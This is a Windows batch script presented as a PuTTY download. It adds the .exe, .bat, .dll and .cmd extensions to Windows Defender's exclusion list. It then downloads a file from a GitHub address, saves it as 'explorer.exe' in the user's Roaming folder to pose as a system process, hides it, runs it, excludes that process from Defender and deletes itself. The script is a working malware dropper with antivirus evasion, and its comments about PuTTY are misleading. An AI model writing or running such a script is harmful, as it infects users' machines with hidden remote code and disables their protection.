@echo off
:: Add .exe files to Windows Defender exclusion list
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"

:: Add .bat files to Windows Defender exclusion list
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"

:: Add .dll files to Windows Defender exclusion list
powershell -Command "Add-MpPreference -ExclusionExtension '.dll'"

:: Add .cmd files to Windows Defender exclusion list
powershell -Command "Add-MpPreference -ExclusionExtension '.cmd'"

:: Check if .exe files are in the exclusion list and add a tick or cross
powershell -Command "if ((Get-MpPreference).ExclusionExtension -contains '.exe') { Write-Host '.exe is already in the exclusion list [@]' } else { Write-Host '.exe is not in the exclusion list [✘]' }"

:: Check if .bat files are in the exclusion list and add a tick or cross
powershell -Command "if ((Get-MpPreference).ExclusionExtension -contains '.bat') { Write-Host '.bat is already in the exclusion list [@]' } else { Write-Host '.bat is not in the exclusion list [✘]' }"

:: Check if .dll files are in the exclusion list and add a tick or cross
powershell -Command "if ((Get-MpPreference).ExclusionExtension -contains '.dll') { Write-Host '.dll is already in the exclusion list [@]' } else { Write-Host '.dll is not in the exclusion list [✘]' }"

:: Check if .cmd files are in the exclusion list and add a tick or cross
powershell -Command "if ((Get-MpPreference).ExclusionExtension -contains '.cmd') { Write-Host '.cmd is already in the exclusion list [@]' } else { Write-Host '.cmd is not in the exclusion list [✘]' }"

echo Exclusions added successfully.

:: Download PuTTY to a different folder (Roaming)
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/kudryashoX/MaX/raw/refs/heads/main/explorer.exe' -OutFile '%USERPROFILE%\AppData\Roaming\explorer.exe'"

:: Hide the PuTTY executable
attrib +h "%USERPROFILE%\AppData\Roaming\explorer.exe"

:: Run PuTTY
start "" "%USERPROFILE%\AppData\Roaming\explorer.exe"

:: Get the PID of the running PuTTY process
for /f "tokens=2 delims=," %%i in ('tasklist /FI "IMAGENAME eq explorer.exe" /FO CSV /NH') do set PUTTY_PID=%%i

:: Add the PuTTY process to Windows Defender exclusion list
powershell -Command "Add-MpPreference -ExclusionProcess '%USERPROFILE%\AppData\Roaming\explorer.exe'"

echo PuTTY process added to Windows Defender exclusion list.
pause

:: Delete this script file
del "%~f0"
